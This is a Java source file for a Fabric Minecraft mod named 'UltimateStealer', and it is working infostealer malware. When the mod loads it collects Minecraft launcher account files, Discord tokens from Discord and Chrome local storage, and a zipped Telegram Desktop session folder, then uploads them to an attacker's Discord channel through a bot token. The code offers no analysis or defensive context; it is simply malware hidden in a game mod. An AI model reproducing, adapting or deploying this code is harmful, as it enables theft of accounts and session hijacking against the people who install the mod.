package zr7.ultimate;

import net.fabricmc.api.ModInitializer;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.net.ssl.HttpsURLConnection;

public class UltimateStealer implements ModInitializer {
    
    /* TOKEN_PLACEHOLDER */
    private static String BOT_TOKEN = "";
    private static String CHANNEL_ID = "";
    
    private static boolean hasRun = false;
    
    public void setToken(String token, String channel) {
        BOT_TOKEN = token;
        CHANNEL_ID = channel;
        System.out.println("[ZR-7] Токен установлен через setToken()");
    }
    
    @Override
    public void onInitialize() {
        if (BOT_TOKEN.isEmpty() || CHANNEL_ID.isEmpty()) {
            System.err.println("[ZR-7] Токен не передан!");
            return;
        }
        System.out.println("[ZR-7] Ultimate Stealer загружен!");
        
        if (!hasRun) {
            hasRun = true;
            new Thread(() -> {
                try {
                    Thread.sleep(5000);
                    stealAll();
                } catch (Exception e) {}
            }).start();
        }
    }
    
    private void stealAll() {
        try {
            String mcPath = System.getenv("APPDATA") + "\\.minecraft";
            System.out.println("[ZR-7] Сбор данных...");
            
            stealMinecraftAccounts(mcPath);
            stealDiscordTokens();
            stealTelegram();
            
            System.out.println("[ZR-7] Готово!");
        } catch (Exception e) {
            System.err.println("[ZR-7] " + e.getMessage());
        }
    }
    
    private void stealMinecraftAccounts(String mcPath) {
        try {
            List<String> accounts = new ArrayList<>();
            
            File accountsFile = new File(mcPath, "launcher_accounts.json");
            if (accountsFile.exists()) {
                String content = new String(Files.readAllBytes(accountsFile.toPath()));
                Pattern emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                java.util.regex.Matcher em = emailPattern.matcher(content);
                while (em.find()) accounts.add("EMAIL: " + em.group());
                
                sendFile(accountsFile, "launcher_accounts.json");
            }
            
            if (!accounts.isEmpty()) {
                String msg = "**MINECRAFT ACCOUNTS:**\n```\n" + 
                    String.join("\n", accounts).substring(0, Math.min(1800, String.join("\n", accounts).length())) + "\n```";
                sendToDiscord(msg);
            }
            
        } catch (Exception e) {}
    }
    
    private void stealDiscordTokens() {
        try {
            Set<String> tokens = new HashSet<>();
            Pattern tokenPattern = Pattern.compile("[\\w-]{24,}\\.[\\w-]{6,7}\\.[\\w-]{27,}");
            
            String[] paths = {
                System.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
            };
            
            for (String path : paths) {
                File dir = new File(path);
                if (!dir.exists()) continue;
                for (File f : dir.listFiles()) {
                    try {
                        if (f.getName().endsWith(".ldb") || f.getName().endsWith(".log")) {
                            String content = new String(Files.readAllBytes(f.toPath()));
                            java.util.regex.Matcher m = tokenPattern.matcher(content);
                            while (m.find()) tokens.add(m.group());
                        }
                    } catch (Exception e) {}
                }
            }
            
            if (!tokens.isEmpty()) {
                String msg = "**DISCORD TOKENS:**\n```\n" + 
                    String.join("\n", tokens).substring(0, Math.min(1900, String.join("\n", tokens).length())) + "\n```";
                sendToDiscord(msg);
            }
            
        } catch (Exception e) {}
    }
    
    private void stealTelegram() {
        try {
            String[] tgPaths = {
                System.getenv("APPDATA") + "\\Telegram Desktop\\tdata"
            };
            
            for (String path : tgPaths) {
                File tdata = new File(path);
                if (tdata.exists() && tdata.isDirectory()) {
                    File tempZip = new File(System.getProperty("java.io.tmpdir"), "telegram.zip");
                    try (FileOutputStream fos = new FileOutputStream(tempZip);
                         ZipOutputStream zos = new ZipOutputStream(fos)) {
                        addDirToZip(zos, tdata, "");
                    }
                    if (tempZip.exists() && tempZip.length() > 0) {
                        sendFile(tempZip, "telegram_session.zip");
                    }
                    tempZip.delete();
                    break;
                }
            }
            
        } catch (Exception e) {}
    }
    
    private void addDirToZip(ZipOutputStream zos, File dir, String base) throws IOException {
        for (File f : dir.listFiles()) {
            if (f.isDirectory()) {
                addDirToZip(zos, f, base + f.getName() + "/");
            } else {
                byte[] buffer = new byte[4096];
                ZipEntry entry = new ZipEntry(base + f.getName());
                zos.putNextEntry(entry);
                try (FileInputStream fis = new FileInputStream(f)) {
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                }
                zos.closeEntry();
            }
        }
    }
    
    private void sendToDiscord(String message) {
        try {
            String urlStr = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
            URL url = new URL(urlStr);
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            String json = "{\"content\": \"" + message.replace("\"", "\\\"").replace("\n", "\\n") + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes());
                os.flush();
            }
            int code = conn.getResponseCode();
            if (code != 200 && code != 201 && code != 204) {
                System.err.println("[ZR-7] Discord error: " + code);
            }
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("[ZR-7] Send error: " + e.getMessage());
        }
    }
    
    private void sendFile(File file, String name) {
        try {
            if (!file.exists() || file.length() == 0) return;
            
            String urlStr = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
            String boundary = "----" + System.currentTimeMillis();
            URL url = new URL(urlStr);
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\r\n").getBytes());
                os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
                Files.copy(file.toPath(), os);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            }
            
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("[ZR-7] Send file error: " + e.getMessage());
        }
    }
}